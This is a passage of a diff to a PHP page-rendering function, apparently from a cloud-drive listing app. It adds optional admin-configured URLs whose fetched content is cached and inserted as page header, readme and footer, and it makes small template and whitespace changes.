+                while (strpos($html, '<!--' . $now_driver . 'UploadJsStart-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsStart-->', '', $html);
+                while (strpos($html, '<!--' . $now_driver . 'UploadJsEnd-->')) $html = str_replace('<!--' . $now_driver . 'UploadJsEnd-->', '', $html);
+            } else {
+                while (strpos($html, '<!--UploadJsStart-->')) {
+                    $tmp = splitfirst($html, '<!--UploadJsStart-->');
+                    $html = $tmp[0];
+                    $tmp = splitfirst($tmp[1], '<!--UploadJsEnd-->');
+                    $html .= $tmp[1];
+                }
+            }
             foreach ($Driver_arr as $driver) {
                 while (strpos($html, '<!--' . $driver . 'UploadJsStart-->')) {
                     $tmp = splitfirst($html, '<!--' . $driver . 'UploadJsStart-->');
@@ -2459,8 +2609,9 @@ function render_list($path = '', $files = [])
             if (strpos($html, '<!--TxtContent-->')) {
                 //$tmp_content = get_content(spurlencode(path_format(urldecode($path)), '/'))['content']['body'];
                 $tmp_content = $files['content']['body'];
-                if (strlen($tmp_content)==$files['size']) $html = str_replace('<!--TxtContent-->', htmlspecialchars($tmp_content), $html);
-                else $html = str_replace('<!--TxtContent-->', $files['size']<1024*1024?htmlspecialchars(curl('GET', $files['url'], '', [], 0, 1)['body']):"File too large: " . $files['size'] . " B.", $html);
+                //if (strlen($tmp_content)==$files['size'])
+                $html = str_replace('<!--TxtContent-->', htmlspecialchars($tmp_content), $html);
+                //else $html = str_replace('<!--TxtContent-->', $files['size']<1024*1024?htmlspecialchars(curl('GET', $files['url'], '', [], 0, 1)['body']):"File too large: " . $files['size'] . " B.", $html);
             }
             $html = str_replace('<!--constStr@FileNotSupport-->', getconstStr('FileNotSupport'), $html);
 
@@ -2794,7 +2945,7 @@ function render_list($path = '', $files = [])
         $imgextstr = '';
         foreach ($exts['img'] as $imgext) $imgextstr .= '\''.$imgext.'\', '; 
         $html = str_replace('<!--ImgExts-->', $imgextstr, $html);
-        
+
 
         $html = str_replace('<!--Sitename-->', $_SERVER['sitename'], $html);
 
@@ -2824,20 +2975,43 @@ function render_list($path = '', $files = [])
         if ($diskname=='') $diskname = $_SERVER['disktag'];
         //if (strlen($diskname)>15) $diskname = substr($diskname, 0, 12).'...';
         while (strpos($html, '<!--DiskNameNow-->')) $html = str_replace('<!--DiskNameNow-->', $diskname, $html);
-        
+
         $tmp = splitfirst($html, '<!--HeadomfStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--HeadomfEnd-->');
         if (isset($files['list']['head.omf'])) {
             $headomf = str_replace('<!--HeadomfContent-->', get_content(path_format($path . '/' . $files['list']['head.omf']['name']))['content']['body'], $tmp[0]);
+        } elseif (getConfig('globalHeadOmfUrl')) {
+            if (!$headomfcontent = getcache('HeadomfContent')) {
+                $headomfres = curl('GET', getConfig('globalHeadOmfUrl'), '', [], 0, 1);
+                if ($headomfres['stat']==200) {
+                    $headomfcontent = $headomfres['body'];
+                    savecache('HeadomfContent', $headomfcontent);
+                } else $headomfcontent = $headomfres['stat'];
+            }
+            $headomf = str_replace('<!--HeadomfContent-->', $headomfcontent, $tmp[0]);
         }
         $html .= $headomf . $tmp[1];
-        
+
         $tmp = splitfirst($html, '<!--HeadmdStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--HeadmdEnd-->');
         if (isset($files['list']['head.md'])) {
             $headmd = str_replace('<!--HeadmdContent-->', get_content(path_format($path . '/' . $files['list']['head.md']['name']))['content']['body'], $tmp[0]);
+            $html .= $headmd . $tmp[1];
+            while (strpos($html, '<!--HeadmdStart-->')) {
+                $html = str_replace('<!--HeadmdStart-->', '', $html);
+                $html = str_replace('<!--HeadmdEnd-->', '', $html);
+            }
+        } elseif (getConfig('globalHeadMdUrl')) {
+            if (!$headmdcontent = getcache('HeadmdContent')) {
+                $headmdres = curl('GET', getConfig('globalHeadMdUrl'), '', [], 0, 1);
+                if ($headmdres['stat']==200) {
+                    $headmdcontent = $headmdres['body'];
+                    savecache('HeadmdContent', $headmdcontent);
+                } else $headmdcontent = $headmdres['stat'];
+            }
+            $headmd = str_replace('<!--HeadmdContent-->', $headmdcontent, $tmp[0]);
             $html .= $headmd . $tmp[1];
             while (strpos($html, '<!--HeadmdStart-->')) {
                 $html = str_replace('<!--HeadmdStart-->', '', $html);
@@ -2877,6 +3051,20 @@ function render_list($path = '', $files = [])
                 $html = str_replace('<!--ReadmemdStart-->', '', $html);
                 $html = str_replace('<!--ReadmemdEnd-->', '', $html);
             }
+        } elseif (getConfig('globalReadmeMdUrl')) {
+            if (!$readmemdcontent = getcache('ReadmemdContent')) {
+                $readmemdres = curl('GET', getConfig('globalReadmeMdUrl'), '', [], 0, 1);
+                if ($readmemdres['stat']==200) {
+                    $readmemdcontent = $readmemdres['body'];
+                    savecache('ReadmemdContent', $readmemdcontent);
+                } else $readmemdcontent = $readmemdres['stat'];
+            }
+            $Readmemd = str_replace('<!--ReadmemdContent-->', $readmemdcontent, $tmp[0]);
+            $html .= $Readmemd . $tmp[1];
+            while (strpos($html, '<!--ReadmemdStart-->')) {
+                $html = str_replace('<!--ReadmemdStart-->', '', $html);
+                $html = str_replace('<!--ReadmemdEnd-->', '', $html);
+            }
         } else {
             $html .= $tmp[1];
             $tmp[1] = 'a';
@@ -2888,20 +3076,28 @@ function render_list($path = '', $files = [])
             }
         }
 
-        
+
         $tmp = splitfirst($html, '<!--FootomfStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--FootomfEnd-->');
         if (isset($files['list']['foot.omf'])) {
             $Footomf = str_replace('<!--FootomfContent-->', get_content(path_format($path . '/' . $files['list']['foot.omf']['name']))['content']['body'], $tmp[0]);
+        } elseif (getConfig('globalFootOmfUrl')) {
+            if (!$footomfcontent = getcache('FootomfContent')) {
+                $footres = curl('GET', getConfig('globalFootOmfUrl'), '', [], 0, 1);
+                if ($footres['stat']==200) {
+                    $footomfcontent = $footres['body'];
+                    savecache('FootomfContent', $footomfcontent);
+                } else $footomfcontent = $footres['stat'];
+            }
+            $Footomf = str_replace('<!--FootomfContent-->', $footomfcontent, $tmp[0]);
         }
         $html .= $Footomf . $tmp[1];
 
-        
         $tmp = splitfirst($html, '<!--MdRequireStart-->');
         $html = $tmp[0];
         $tmp = splitfirst($tmp[1], '<!--MdRequireEnd-->');
-        if (isset($files['list']['head.md'])||isset($files['list']['readme.md'])) {
+        if (isset($files['list']['head.md'])||isset($files['list']['readme.md'])||getConfig('globalHeadMdUrl')||getConfig('globalReadmeMdUrl')) {
             $html .= $tmp[0] . $tmp[1];
         } else $html .= $tmp[1];
 
